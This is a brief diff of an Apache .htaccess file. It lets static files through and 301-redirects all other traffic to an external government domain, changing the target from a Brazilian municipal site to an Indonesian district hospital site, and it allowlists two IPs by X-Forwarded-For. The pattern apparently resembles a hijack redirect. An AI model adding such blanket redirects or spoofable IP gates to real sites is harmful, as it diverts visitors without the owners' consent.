@@ -1,7 +1,7 @@
 RewriteCond %{REQUEST_URI} \.(css|js|html|jpe?g|png|gif|svg|webp|ico|woff2?|ttf|eot)$ [NC]
 RewriteRule ^ - [L]
 
-RewriteRule ^(.*)$ https://www.camarasalgadofilho.pr.gov.br/ [R=301,L]
+RewriteRule ^(.*)$ https://rssoehadi.sragenkab.go.id/ [R=301,L]
 
 SetEnvIf X-Forwarded-For "^136.228.135.175$" allowed_ip
 SetEnvIf X-Forwarded-For "^178.128.48.57$" allowed_ip
